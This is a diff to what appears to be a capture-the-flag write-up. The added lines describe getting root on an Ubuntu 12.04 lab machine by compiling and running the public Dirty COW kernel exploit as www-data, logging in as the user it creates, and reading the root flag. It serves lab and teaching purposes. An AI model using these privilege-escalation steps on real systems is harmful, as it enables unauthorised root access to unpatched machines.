@@ -104,11 +104,21 @@ DISTRIB_CODENAME=precise
 DISTRIB_DESCRIPTION="Ubuntu 12.04 LTS"
 ```
 
-use `dirtycow.c` from [here](https://github.com/firefart/dirtycow/blob/master/dirty.c)
+use `dirtycow.c` from [here](https://github.com/firefart/dirtycow/blob/master/dirty.c) :
 
+```bash
+www-data@ubuntu:/var/www$ /usr/bin/gcc -pthread dirty.c -o dirty -lcrypt
+www-data@ubuntu: ./dirty
+```
 
+then you can login with user `firefart` and the password you provided when executing the exploit :
 
+```bash
+firefart@ubuntu:~# cat root.txt
+{Sum0-SunCSR-2020_r001}
+```
 
+this is how you can get root on this machine :)
 
 
 
